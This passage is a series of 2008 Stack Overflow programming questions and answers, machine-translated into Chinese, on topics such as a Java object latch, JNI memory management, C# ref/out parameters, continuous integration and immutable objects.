{
  object o = property.GetValue(control, null);
  // write value of o.ToString() out as an attribute on a XmlNode
  // where attribute name is property.Name
} 
```

# java - 大小 = 1 的 Java BlockingQueue？

> ID：214661
> 
> 赞同：3
> 
> 时间：2008-10-18T06:06:42.513
> 
> 标签：java, multithreading, queue

基本上我想要的是一个 size=1 的 BlockingQueue。我有一个“侦听器”线程，它只是等待、阻塞，直到一个对象被放入队列，然后检索它——以及一个“生产者”线程，它实际上将对象放入队列。

我可以用一些同步块和 BlockingQueue 实现来实现这一点，但这似乎有点矫枉过正。有没有更好、更简单的方法来做我想做的事？

示例界面：

```
public interface Wait<T> {
  /**
   * If "put" has never been called on this object, then this method will
   * block and wait until it has. Once "put" has been called with some T, this
   * method will return that T immediately.
   */
  public T get() throws InterruptedException;

  /**
   * @param object The object to return to callers of get(). If called more
   * than once, will throw an {@link IllegalStateException}.
   */
  public void put(T object);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-18T06:22:21.140

你的意思是[SynchronousQueue](http://java.sun.com/j2se/1.5.0/docs/api/java/util/concurrent/SynchronousQueue.html)之类的东西？另一个有用的类是[Exchanger](http://java.sun.com/j2se/1.5.0/docs/api/java/util/concurrent/Exchanger.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-07T05:57:54.087

我在这里找到了一个名为“ObjectLatch”的类的代码：http://forums.sun.com/thread.jspa?threadID= [5321141](http://forums.sun.com/thread.jspa?threadID=5321141)

```
package jfco.progs;

import java.util.concurrent.CountDownLatch;

/**
 * <H1>A Blocking Object Latch</H1> This class implements a blocking object
 * latch, that acts as a synchronizer between a producer of an object and it's
 * consumer(s).
 * <p>
 * An object is set with <code>set()</code>only ONCE. Further attempts to set
 * the object are just ignored.<br>
 * <p>
 * Consumers request the object with <code>get()</code>. If the object is not
 * already set, consumers are blocked waiting until the object is available or <br>
 * until an interrupt (InteruptedException) terminates the wait.
 * <p>
 * The latch can be tested for object availability with isAvailable(), which
 * answers true if the object has already been set. <br>
 */
public class ObjectLatch<R> {

    /** The object. */
    private R object = null;

    /** The latch counter created and set to 1\. */
    private final CountDownLatch latch = new CountDownLatch(1);

    /**
     * Checks if the object is already available (has been already set).
     * 
     * @return true, if the object is already available (has been already set)
     */
    public boolean isAvailable() {
        return latch.getCount() == 0;
    }

    /**
     * Sets the object if it is not already set. Otherwise ignore this request.
     * 
     * @param object
     *            the object
     */
    public synchronized void set(R object) {
        if (!isAvailable()) {
            this.object = object;
            latch.countDown();
        }
    }

    /**
     * Get the object if it is already available (has already been set).
     * <p>
     * If it is not available, wait until it is or until an interrupt
     * (InterruptedException) terminates the wait.
     * 
     * @return the object if it is already available (has already been set)
     * 
     * @throws InterruptedException
     */
    public R get() throws InterruptedException {
        latch.await();
        synchronized (this) {
            return object;
        }
    }
} 
```

# c++ - 在 DS 上将一组颜色数据保存为 PNG 文件

> ID：214687
> 
> 赞同：2
> 
> 时间：2008-10-18T06:40:45.707
> 
> 标签：c++, png, nintendo-ds

我正在寻找一个库来将一组颜色数据保存到 PNG 文件中。（这就是它的全部内容，对吧？我对 PNG 的内部结构知之甚少。）

这是用于 Nintendo DS 开发的，所以最好是轻量级的。我不需要任何其他花哨的功能，例如旋转等。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-18T10:24:55.723

要编码任何类型的 PNG 文件，libpng 是一种行之有效的方法。

但是，在像 DS 这样的小型设备上，您确实希望以显示硬件期望的格式存储图像数据。让 libpng 在该平台上工作在技术上是可行的，但在加载时间和占用空间方面都会增加大量开销。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T06:51:34.810

你看过libpng吗？[http://www.libpng.org/pub/png/libpng.html](http://www.libpng.org/pub/png/libpng.html)

我不确定内存占用是否可以接受，但您可能应该知道 PNG 文件所涉及的不仅仅是一组颜色。性能可能是 DS 的一个问题。

如果你使用 libpng，你还需要 zlib，如果你使用的是 DevKitPro，你可能会遇到一些缺失的函数（从玩代码 5 分钟，它看起来依赖于 pow()似乎不在 libnds 中。）我不知道官方 Nintendo SDK 以标准库的方式提供了什么——如果你正在使用它，你可能会处于更好的状态。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T05:48:41.073

我设法找到了一个支持 PNG 的库（使用 libpng）并允许您只给它原始图像数据。

它被称为[LibPicture](http://www.dragonminded.com/?loc=ndsdev/LibPicture)。不过它有点大：~1MB。

# c# - 为什么 .Net 框架指南建议您不要使用 ref/out 参数？

> ID：214688
> 
> 赞同：9
> 
> 时间：2008-10-18T06:41:43.317
> 
> 标签：c#, .net, parameters, function

显然，它们“令人困惑”。这是认真的原因吗？你能想到其他人吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-18T06:48:44.567

你见过有多少开发者并不真正了解 ref/out 吗？

我在真正需要的地方使用它们，但不是在其他地方使用它们。它们通常仅在您想有效地返回两个或多个值时才有用 - 在这种情况下，至少值得*考虑*是否有一种方法可以使该方法只做一件事。有时使用 ref/out*是*最合适的方法 - 各种 TryParse 方法等。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-18T09:11:47.320

在我看来，它们被认为是代码异味，因为通常有一个更好的选择：返回一个对象。

如果您注意到，在 .NET 库中，它们仅在某些特殊情况下使用，即*类似 tryparse*的场景：

*   返回一个类意味着装箱一个值类型
*   该方法的合同要求它快速，因此装箱/拆箱不是一个可行的选择。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-18T06:59:56.307

ref/out 自动意味着可变性，而具有不可变值的函数式编程如今风靡一时。尝试将对 Dictionary.TryGetValue 的调用插入到 LINQ 查询中。API 需要声明变量并破坏 API 中的任何“流畅性”。

这并不是说这是“原因”，而是“原因”的一个例子。

（也可以看看

[http://lorgonblog.spaces.live.com/blog/cns!701679AD17B6D310!181.entry](http://lorgonblog.spaces.live.com/blog/cns!701679AD17B6D310!181.entry)

有关函数式语言如何处理此类 API 的评论。）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-18T07:34:14.957

困惑可能是最好的理由。混淆意味着降低可维护性并增加引入细微错误的可能性。我以与“goto”控制流语句类似的方式看待它们。虽然它本身并不是坏事，但在过去的几十年里，它导致了许多无法阅读/理解的程序。

远离任何可能使您的代码更加混乱的事情。

话虽如此，这些关键字的存在可能是因为框架开发人员看到了对这些东西的需求。如果没有合适的解决方法，请使用它们，但尽可能避免使用它们。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-18T07:20:13.537

ref/out 也不适用于“Func”委托，因此这些样式 API 与其他一些使用委托的 API 的组合/重用性较差。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-19T02:45:11.263

**只是一个想法，当参数捕获目标方法中的执行状态**而不是捕获返回的数据时，我发现 ref/out 很有用。当您希望从返回客户对象的服务中获取错误消息时，请考虑一个场景。

```
Customer GetCustomerById(int id, out string errorMessage); 
```

如果此方法失败，您可能会返回 null Customer 对象或引发异常。但是，如果我想知道错误的原因（验证？数据库？），我会使用 out 参数。这里的errorMessage参数与数据无关，只是用来捕捉方法执行的问题。

就个人而言，如果我有一个方法可以返回两个或更多基本数据/值，我会重新考虑我的代码设计。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-19T03:34:50.290

我被告知的原因是 1.0 GC 在使用 ref/out 时出现问题。2.0（也可能不是 1.1）中的 GC 没有这些问题，所以我通常认为它现在是无用的遗产。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-20T06:22:01.827

@TraumaPony 如果您向我们提供此 .NET 框架指南的来源（URL 或其他内容），那就太好了。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2008-10-18T18:58:41.533

您应该返回对象可能是他们建议不使用 ref 或 out 的最可能原因。

“ref”实际上只需要在传递标量值时使用，但我看到人们经常将它用于通过引用传递的对象。

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2008-10-18T18:19:37.850

代码复杂性的理由还不够吗？比较：

```
int myValue;
ReadFromSomewhere(ref myValue); 
```

到：

```
int myValue = ReadFromSomewhere(); 
```

# version-control - 有哪些反对使用持续集成的论据？

> ID：214695
> 
> 赞同：23
> 
> 时间：2008-10-18T06:49:44.750
> 
> 标签：version-control, continuous-integration, build-automation

我可以想到很多使用它的充分理由；但是，它有什么缺点呢？

（除了购买另一台服务器）

使用每日构建而不是它有什么好处？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-10-18T08:01:30.973

（值得注意的是，“持续集成”是指**自动**集成与**自动**构建过程并**自动**运行测试并**自动**检测每个部分的故障。

还值得注意的是，“持续集成”仅指中继或测试服务器。这并不意味着“推动每一个变化”。

有很多方法可以错误地进行持续集成。）

* * *

我想不出任何不做持续集成测试的理由。我想我假设“持续集成”包括测试。仅仅因为它编译并不意味着它可以工作。

如果您的构建和/或测​​试需要很长时间，那么持续集成可能会变得昂贵。在这种情况下，在提交之前运行与您的更改明显相关的测试（覆盖分析工具，如[Devel::CoverX::Covered可以帮助发现哪些测试与哪些代码一起使用），在提交后使用](http://search.cpan.org/perldoc?Devel::CoverX::Covered)[SVN](http://search.cpan.org/perldoc?SVN::Notify)之类的东西进行集成测试[::Notify](http://search.cpan.org/perldoc?SVN::Notify)，并在失败时提醒开发人员。[使用类似Smolder](http://sourceforge.net/projects/smolder)的东西存档测试结果。这允许开发人员快速工作，而不必坐在那里观看测试套件的运行，同时仍能及早发现错误。

也就是说，通过一些工作，您通常可以加快构建和测试过程。很多时候，缓慢的测试是由于每个测试都必须进行过多的设置和拆卸，指向一个过于耦合的系统，需要设置整个系统来测试一小部分。

解耦通常会有所帮助，将子系统分解为独立的项目。更小的范围更容易理解和更快的构建和测试。每个提交都可以进行完整的构建和测试，而不会给程序员带来不便。然后可以将所有子项目收集在一起进行集成测试。

在每次提交时运行测试套件的主要优势之一，即使是在提交之后，您也知道是什么破坏了构建。而不是“我们昨天做的事情破坏了构建”，或者更糟糕的是“我们昨天做的四件事以不同的方式破坏了构建，现在我们必须解开它”，而是“修订版 1234 破坏了构建”。您只需检查一个修订版即可发现问题。

进行每日构建的优势在于，至少您知道每天都会进行完整、干净的构建和测试运行。但无论如何你都应该这样做。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-10-18T07:28:10.103

我不认为它有任何缺点。但是为了争论，这里是[Eric Minick 关于 UrbanCode 的文章](http://www.anthillpro.com/blogs/anthillpro-blog/2008/07/14/1216083300000.html) *（“这是关于测试而不是构建。”）*他批评了基于[Martin Fowler 工作](http://martinfowler.com/articles/continuousIntegration.html)的工具，说他们没有给测试留足够的时间。

*“要在 CI 中真正取得成功，Fowler 断言构建应该是自我测试的，并且这些测试包括单元测试和端到端测试。同时，构建应该非常快——最好不到十分钟- 因为它应该在每次提交时运行。如果有大量的端到端测试，在构建时执行它们同时将整个过程保持在十分钟以内是不现实的。

在每次提交时添加对构建的需求，并且要求开始变得不可能。选项要么是较慢的反馈，要么是删除一些测试。*

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2008-11-18T17:55:45.313

James Shore 有很多关于认为使用像 CruiseControl 这样的 CI 工具意味着你在进行持续集成的危险的博客文章：

*   [为什么我不喜欢 CruiseControl](http://jamesshore.com/Blog/Why%20I%20Dont%20Like%20CruiseControl.html)
*   [持续集成是一种态度而不是工具](http://jamesshore.com/Blog/Continuous-Integration-is-an-Attitude.html)
*   [每天一美元的持续集成](http://jamesshore.com/Blog/Continuous-Integration-on-a-Dollar-a-Day.html)

设置 CI 服务器的一个危险是目标偏移，认为重要的是“保持构建通过”而不是“确保我们拥有高质量的软件”。所以人们不再关心测试需要多长时间运行。然后他们在签入之前需要很长时间才能运行所有这些。然后构建不断中断。然后构建总是被破坏。所以人们注释掉测试以使构建通过。并且软件的质量下降了，但是，嘿，构建正在通过......

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-11-18T17:04:51.610

通常有两种情况我认为持续集成没有真正意义。请记住，我是 CI 的大力倡导者，并尽可能使用它。

第一个是投资回报率没有意义的时候。我目前开发了几个小型内部应用程序。这些应用程序通常非常琐碎，开发的整个生命周期大约是一两个星期。为 CI 正确设置一切可能会翻倍，我可能再也看不到这种投资了。您可以争辩说我会在维护中恢复它，但这些应用程序在更新时很可能会被丢弃。请记住，您的工作可能是发布软件，而不是达到 100% 的代码覆盖率。

我听说过的另一种情况是，如果你不打算对结果做任何事情，CI 就没有意义。例如，如果您的软件必须发送给 QA，而 QA 人员只能真正每隔几天查看一个新版本，那么每隔几个小时进行一次构建是没有意义的。如果其他开发人员不打算查看代码指标并尝试改进它们，那么跟踪它们是没有意义的。诚然，这不是 CI 不是一种好的技术的错，而是您的团队缺乏愿意接受 CI 的原因。然而，在这种情况下实施 CI 系统是没有意义的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-19T22:27:16.560

开始时，需要一段时间来设置所有内容。

如果您添加测试、覆盖率、静态代码检查、重复搜索、文档构建和部署，可能需要很长时间（数周）才能正确完成。之后，维护构建可能是一个问题。

例如，如果您向解决方案添加测试，您可以让构建根据某些标准自动检测它们，或者您必须手动更新构建设置。自动检测更难正确。覆盖范围相同。与文档生成相同...

* * *

## 回答 #6

> 赞同：-5
> 
> 时间：2008-10-18T08:43:39.623

不进行持续集成的唯一充分理由是当您的项目工作到您的集成测试在很长一段时间内没有发现任何缺陷并且每次运行它们都花费太多时间时一个构建。换句话说：你已经完成了足够多的持续集成，你已经向自己证明你不再需要它了。

# filesystems - C# 中的文件路径/大小

> ID：214698
> 
> 赞同：1
> 
> 时间：2008-10-18T06:55:46.393
> 
> 标签：filesystems, clr, directory

如何获取文件的文件目录 (C:\myfolder\subfolder\mydoc.pdf)。我还想添加子文件夹的大小，最后是主文件夹的大小。这适用于我需要与 SQL Server 2005 集成以生成 SSRS 报告的 .NET CLR。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-18T07:00:45.540

您可以使用[GetDirectoryName](http://msdn.microsoft.com/en-us/library/system.io.path.getdirectoryname(VS.80).aspx)，仅获取文件的目录路径：

```
using System.IO;
string directoryName = Path.GetDirectoryName(@"C:\myfolder\subfolder\mydoc.pdf");
// directoryName now contains "C:\myfolder\subfolder" 
```

为了计算目录和子目录的大小，你可以这样做：

```
public static long DirSize(DirectoryInfo d) 
{    
    long Size = 0;    
    // Add file sizes.
    FileInfo[] fis = d.GetFiles();
    foreach (FileInfo fi in fis) 
    {      
        Size += fi.Length;    
    }
    // Add subdirectory sizes.
    DirectoryInfo[] dis = d.GetDirectories();
    foreach (DirectoryInfo di in dis) 
    {
        Size += DirSize(di);   
    }
    return(Size);  
} 
```

# java - 使用调用 API 的 JNI 内存管理

> ID：214699
> 
> 赞同：6
> 
> 时间：2008-10-18T06:56:36.720
> 
> 标签：java, c, memory-management, java-native-interface

当我使用 JNI 方法构建 java 对象时，为了将它作为参数传递给我使用 JNI 调用 API 调用的 java 方法，我如何管理它的内存？

这是我正在使用的内容：

我有一个 C 对象，它的析构函数方法比`free()`. 这个 C 对象将与一个 Java 对象相关联，一旦应用程序完成了 Java 对象，我就不再需要 C 对象了。

我正在像这样创建 Java 对象（为清楚起见，省略了错误检查）：

```
c_object = c_object_create ();
class = (*env)->FindClass (env, "my.class.name");
constructor = (*env)->GetMethodID (env, class, "<init>", "(J)V");
instance = (*env)->NewObject (env, class, constructor, (jlong) c_object);

method = (*env)->GetMethodID (env, other_class, "doSomeWork", "(Lmy.class.name)V");
(*env)->CallVoidMethod (env, other_class, method, instance); 
```

那么，既然我已经完成了`instance`，我该怎么办呢？理想情况下，我想把垃圾收集留给虚拟机；当它完成时，`instance`如果它还调用`c_object_destroy()`我提供给它的指针，那就太棒了。这可能吗？

一个单独但相关的问题与我在这样的方法中创建的 Java 实体的范围有关；我是否必须手动释放，比如说，，，`class`或`constructor`以上`method`？JNI 文档在正确内存管理的主题上令人沮丧地模糊（根据我的判断）。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-18T22:11:51.050

JNI 规范涵盖了谁“拥有”在 JNI 方法中创建的 Java 对象的[问题](http://java.sun.com/j2se/1.5.0/docs/guide/jni/spec/design.html#wp16785)。您需要区分**本地**引用和**全局**引用。

当 JVM 对本机代码进行 JNI 调用时，它会设置一个注册表来跟踪调用期间创建的所有对象。在本机调用期间创建的任何对象（即从 JNI 接口函数返回）都将添加到此注册表中。对此类对象的引用称为**本地引用**。当本机方法返回 JVM 时，本机方法调用期间创建的所有本地引用都将被销毁。如果您在本机方法调用期间向 JVM 进行回调，则当控制权返回本机方法时，本地引用仍然有效。如果从本机代码调用的 JVM 再次调用本机代码，则会创建一个新的本地引用注册表，并应用相同的规则。

（实际上，您可以使用 JNI 接口实现您自己的 JVM 可执行文件（即 java.exe），方法是创建一个 JVM（从而接收一个 JNIEnv * 指针），在命令行上查找给定的类，然后调用main() 方法。）

**从 JNI 接口方法返回的所有引用都是本地的**。这意味着在正常情况下，您不需要手动释放 JNI 方法返回的引用，因为它们在返回 JVM 时会被销毁。有时您仍然想“过早地”销毁它们，例如当您想要在返回 JVM 之前删除大量本地引用时。

使用 NewGlobalRef() 创建全局引用（从本地引用）。它们被添加到一个特殊的注册表中，并且必须手动解除分配。全局引用仅用于本机代码需要跨多个 JNI 调用保存引用的 Java 对象，例如，如果您有应传播回 Java 的本机代码触发事件。在这种情况下，JNI 代码需要存储对要接收事件的 Java 对象的引用。

希望这能稍微澄清一下内存管理问题。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-18T16:37:32.333

有几种策略可以回收本地资源（对象、文件描述符等）

1.  在 finalize() 期间调用 JNI 方法来释放资源。有些人[建议不要实现 finalize](https://stackoverflow.com/questions/158174/why-would-you-ever-implement-finalize)，基本上你不能确定你的本地资源是否被释放。对于内存等资源，这可能不是问题，但如果您有一个文件需要在可预测的时间刷新，finalize() 可能不是一个好主意。

2.  手动调用清理方法。如果您在某个时间点知道必须清理资源，这将很有用。当我有一个必须在卸载 JNI 代码中的 DLL 之前释放的资源时，我使用了这种方法。为了允许稍后重新加载 DLL，在尝试卸载 DLL 之前，我必须确保对象确实被释放。仅使用 finalize()，我不会得到这个保证。这可以与 (1) 结合使用，以允许在 finalize() 期间或在手动调用的清理方法中分配资源。（您可能需要 WeakReferences 的规范映射来跟踪哪些对象需要调用其清理方法。）

3.  据说**PhantomReference**也可以用来解决这个问题，但我不确定这样的解决方案究竟是如何工作的。

实际上，我不得不在 JNI 文档上不同意你的观点。我发现[JNI 规范](http://java.sun.com/j2se/1.5.0/docs/guide/jni/spec/jniTOC.html)在大多数重要问题上都非常清楚，即使关于管理本地和全局引用的部分可以更详细地阐述。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T07:44:58.960

GC 会收集您的实例，但不会自动释放在本机代码中分配的非 Java 堆内存。你应该在你的类中有明确的方法来释放 c_object 实例。

这是我建议使用终结器检查 c_object 是否已释放并释放它的情况之一，如果没有则记录一条消息。

一个有用的技术是在 Java 类构造函数中创建一个 Throwable 实例并将其存储在一个字段中（或者只是内联初始化该字段）。如果终结器检测到类没有被正确处理，它将打印堆栈跟踪，精确定位分配堆栈。

一个建议是避免直接使用 JNI 并使用[gluegen](https://gluegen.dev.java.net/)或[Swig](http://www.swig.org/)（两者都生成代码并且可以静态链接）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T20:10:49.453

回复：“一个单独但相关的问题”......当您在“本地”上下文中使用它们时，您不需要手动释放 jclass、jfieldID 和 jmethodID。您获得的任何实际对象引用（不是 jclass、jfieldID、jmethodID）都应该使用 DeleteLocalRef 释放。

# c++ - 为什么指针在函数转换过程中会自行改变？

> ID：214700
> 
> 赞同：5
> 
> 时间：2008-10-18T06:57:18.153
> 
> 标签：c++, pointers

在以下情况下，我`Func`使用传递给它的指针调用 a，但在被调用函数中，参数将指针值显示为完全虚假的东西。像下面的东西。

```
bool flag = Func(pfspara);--> pfspara = 0x0091d910 

bool Func(PFSPARA pfspara) --> pfspara = 0x00000005
{
    return false;
} 
```

为什么会`pfspara`更改为一些虚假的指针？我无法在调试中重现该问题，只能在生产中重现。

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-18T07:25:50.513

如果您尝试在例如 Visual Studio 中调试优化代码，则不能总是依赖调试器正确显示变量的值——尤其是在变量未使用时编译器可能会将其优化掉。

尝试运行它：

```
bool Func(PFSPARA pfspara)
{
    printf("%x\n", pfspara);
    return false;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T07:22:53.857

一般来说，这绝不应该发生。可能导致此类症状的问题包括调用模块和调用模块之间的编译选项不兼容、成员函数指针的错误转换或只是编译器错误。您需要提供有关您的问题的更多详细信息：显示真实代码、指定编译器、指定调试与生产编译标志等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T20:35:53.660

对我来说，这听起来像是一个缓冲区溢出问题——有些东西正在覆盖那个变量。但正如其他答案中提到的那样，如果没有一些实际的代码可以使用，就无法确定。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-19T12:10:51.667

对我来说，这听起来像是你在堆栈上乱写......在你的代码中的某个地方堆栈上的缓冲区溢出，或者你正在获取堆栈上对象的地址并在函数返回后写入它。这会导致您的堆栈损坏。

它可能仅在释放模式下发生，因为由于优化和排除用于帮助检查这种情况的“保护”块，堆栈分配是不同的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-18T08:29:56.140

除了 Rasmus 的评论之外，我发现通常值得检查问题是否出现在调试版本以及发布版本中。如果您在发布版本中发现真正的问题，但在调试版本中没有，这通常是由于优化过程暴露的错误，例如未初始化的变量。在调试版本中进行大部分测试，以避免您在此处看到的问题，然后发布发布版本，这是一个真正的危险。IMO，如果您没有一个好的回归测试套件（最好是自动化的），我会避免发送优化代码。

# c++ - Microsoft Windows 上的 C 或 C++ BigInt 库

> ID：214706
> 
> 赞同：2
> 
> 时间：2008-10-18T07:19:13.180
> 
> 标签：c++, c, windows, biginteger

对于在 Microsoft Windows 上运行的编译器，有哪些任意精度整数（和或有理数）库，您会推荐哪个？

请说明该库的许可类型/成本、支持的编译器（即 GCC 和或 VC++）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-18T07:19:18.687

[GMP](http://gmplib.org/)。

LGPL。官方网站的标准下载是为 GCC 设计的。VC++ 端口可从[此处](http://gladman.plushost.co.uk/oldsite/computing/gmp4win.php)获得。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-19T21:13:04.697

我没有使用它，所以我在这里盲目地指点你：

Tom St Denis 的 LibTomMath：http: [//libtom.org/](http://libtom.org/)

公共领域许可。网站提到该库使用 GCC 2.95 [及更高版本] 以及 Visual C++ v6.00 [带有 SP5] 开箱即用，无需配置。

提供配套书籍：http: [//www.amazon.com/dp/1597491128](https://rads.stackoverflow.com/amzn/click/com/1597491128)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-18T21:21:56.750

OpenSSL [BN](http://www.openssl.org/docs/crypto/bn.html)类型。BSD 风格的许可证，很确定它适用于 Windows。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-08-03T14:57:12.007

[在 C++ 中解决 Project Euler 问题的最佳 bignum 库？](https://stackoverflow.com/questions/1047203/best-bignum-library-to-solve-project-euler-problems-in-c)

# oop - 可变对象与不可变对象

> ID：214714
> 
> 赞同：188
> 
> 时间：2008-10-18T07:28:54.737
> 
> 标签：oop, immutability, mutable

我试图了解可变对象与不可变对象。使用可变对象会带来很多负面影响（例如，从方法中返回字符串数组），但我无法理解这样做的负面影响。使用可变对象的最佳实践是什么？你应该尽可能避免它们吗？

* * *

## 回答 #1

> 赞同：175
> 
> 时间：2008-10-18T07:38:59.987

嗯，这有几个方面。

1.  没有引用标识的可变对象有时会导致错误。例如，考虑一个`Person`具有基于值的方法的 bean `equals`：

    ```
    Map<Person, String> map = ...
    Person p = new Person();
    map.put(p, "Hey, there!");

    p.setName("Daniel");
    map.get(p);       // => null 
    ```

    `Person`当用作键时，该实例在映射中“丢失”，因为它的`hashCode`相等性基于可变值。这些值在地图之外发生了变化，所有的散列都过时了。理论家喜欢在这一点上大谈特谈，但在实践中我并没有发现它是一个太大的问题。

2.  另一个方面是代码的逻辑“合理性”。这是一个很难定义的术语，涵盖了从可读性到流畅性的所有内容。通常，您应该能够查看一段代码并轻松理解它的作用。但比这更重要的是，你应该能够说服自己它做的事情是*正确*的。当对象可以在不同的代码“域”中独立更改时，有时很难跟踪什么在哪里以及为什么会发生（“[远处的诡异动作](https://en.wikipedia.org/wiki/Action_at_a_distance_%28computer_programming%29)”）。这是一个更难举例说明的概念，但在更大、更复杂的架构中经常会遇到这种情况。

3.  最后，可变对象在并发情况下是*杀手。*每当您从不同的线程访问可变对象时，您都必须处理锁定问题。*这会降低*吞吐量并使您的代码更难维护。一个足够复杂的系统使这个问题变得不成比例，以至于几乎无法维护（即使对于并发专家）。

不可变对象（尤其是不可变集合）避免了所有这些问题。一旦你弄清楚它们是如何工作的，你的代码就会发展成更容易阅读、更容易维护并且不太可能以奇怪和不可预测的方式失败的东西。不可变对象甚至更容易测试，不仅因为它们易于模拟，而且因为它们倾向于强制执行的代码模式。简而言之，它们都是很好的练习！

话虽如此，我在这件事上几乎不是狂热者。当一切都是不可变的时，有些问题就不能很好地建模。但是我确实认为您应该尝试将尽可能多的代码推向那个方向，当然假设您使用的语言使这成为一个站得住脚的观点（C/C++ 使这变得非常困难，Java 也是如此） . 简而言之：优势在某种程度上取决于您的问题，但我倾向于更喜欢不变性。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2013-09-18T04:04:57.567

## 不可变对象与不可变集合

关于可变对象与不可变对象的争论中的一个更好的观点是将不可变性的概念扩展到集合的可能性。不可变对象是通常表示数据的单个逻辑结构的对象（例如不可变字符串）。当你有一个不可变对象的引用时，对象的内容不会改变。

不可变集合是永远不会改变的集合。

当我对可变集合执行操作时，我会更改集合，所有引用该集合的实体都会看到更改。

当我对不可变集合执行操作时，会返回对反映更改的新集合的引用。引用集合的先前版本的所有实体都不会看到更改。

聪明的实现不一定需要复制（克隆）整个集合来提供这种不变性。最简单的例子是实现为单链表的堆栈和推入/弹出操作。您可以在新集合中重用上一个集合中的所有节点，只为推送添加一个节点，而为弹出不克隆任何节点。另一方面，单链表上的 push_tail 操作并不那么简单或高效。

## 不可变与可变变量/引用

一些函数式语言将不变性的概念用于对象引用本身，只允许单个引用分配。

*   在 Erlang 中，所有“变量”都是如此。我只能将对象分配给一个引用一次。如果我要对集合进行操作，我将无法将新集合重新分配给旧引用（变量名）。
*   Scala 也将这一点构建到语言中，所有引用都用**var**或**val**声明，vals 只是单一赋值并促进函数式风格，但 vars 允许更像 C 或 Java 的程序结构。
*   var/val 声明是必需的，而许多传统语言使用可选修饰符，例如java中的**final**和C中的**const 。**

## 易于开发与性能

几乎总是使用不可变对象的原因是为了促进无副作用的编程和对代码的简单推理（尤其是在高度并发/并行的环境中）。如果对象是不可变的，您不必担心底层数据会被另一个实体更改。

主要缺点是性能。这是[我在 Java 中进行的一个简单测试的](http://www.bgjackson.net/?p=7)文章，比较了玩具问题中的一些不可变对象和可变对象。

性能问题在许多应用程序中没有实际意义，但并非全部，这就是为什么许多大型数值包（例如 Python 中的 Numpy Array 类）允许对大型数组进行就地更新。这对于使用大型矩阵和向量运算的应用领域非常重要。这种大型数据并行和计算密集型问题通过就地操作实现了极大的加速。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2008-10-18T07:58:24.847

不可变对象是一个非常强大的概念。它们消除了试图为所有客户端保持对象/变量一致的大量负担。

您可以将它们用于低级、非多态对象（例如 CPoint 类），这些对象主要用于值语义。

或者，您可以将它们用于高级、多态接口——例如表示数学函数的 IFunction——专门用于对象语义。

最大优势：不变性 + 对象语义 + 智能指针使对象所有权成为非问题，默认情况下，对象的所有客户端都有自己的私有副本。隐含地，这也意味着存在并发时的确定性行为。

缺点：当与包含大量数据的对象一起使用时，内存消耗可能会成为一个问题。对此的解决方案可能是保持对对象符号的操作并进行惰性求值。但是，这可能会导致符号计算链，如果接口不是为适应符号操作而设计的，则可能会对性能产生负面影响。在这种情况下绝对要避免的事情是从方法中返回大量内存。结合链式符号操作，这可能会导致大量内存消耗和性能下降。

所以不可变对象绝对是我思考面向对象设计的主要方式，但它们不是教条。它们为对象的客户解决了很多问题，但也创造了很多问题，尤其是对于实现者。

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2014-06-10T06:22:28.623

查看这篇博文：[http](http://www.yegor256.com/2014/06/09/objects-should-be-immutable.html) ://www.yegor256.com/2014/06/09/objects-should-be-immutable.html 。它解释了为什么不可变对象比可变对象更好。简而言之：

*   不可变对象更易于构造、测试和使用
*   真正不可变的对象总是线程安全的
*   它们有助于避免时间耦合
*   它们的使用没有副作用（没有防御性副本）
*   避免了身份可变性问题
*   他们总是有失败的原子性
*   它们更容易缓存

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2008-10-18T07:33:58.313

您应该指定您正在谈论的语言。对于 C 或 C++ 等低级语言，我更喜欢使用可变对象来节省空间并减少内存流失。在高级语言中，不可变对象可以更容易地推断代码（尤其是多线程代码）的行为，因为没有“远处的诡异动作”。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-10-18T07:39:54.743

可变对象只是一个可以在创建/实例化后修改的对象，而不是一个不能修改的不可变对象（请参阅[该主题的 Wikipedia 页面](http://en.wikipedia.org/wiki/Immutable_object)）。编程语言中的一个例子是 Python 的列表和元组。列表可以修改（例如，可以在创建后添加新项目）而元组不能。

对于哪种情况更适合所有情况，我真的不认为有一个明确的答案。他们都有自己的位置。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2015-10-31T18:27:03.867

不久：

